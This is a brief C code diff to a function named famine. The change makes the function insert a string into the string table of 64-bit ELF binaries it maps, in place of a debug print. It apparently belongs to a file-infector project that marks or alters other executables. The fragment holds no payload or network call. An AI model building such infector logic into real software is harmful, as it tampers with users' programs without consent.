@@ -20,7 +20,7 @@ int famine(int fd)
         return (-1);
     }
     if (is_elf_64(mem, s.st_size))
-        debug("%s", "elf");
+        add_str_to_strtab(FAMINE, fd, mem, s.st_size);
     munmap(mem, s.st_size);
     return 0;
 }
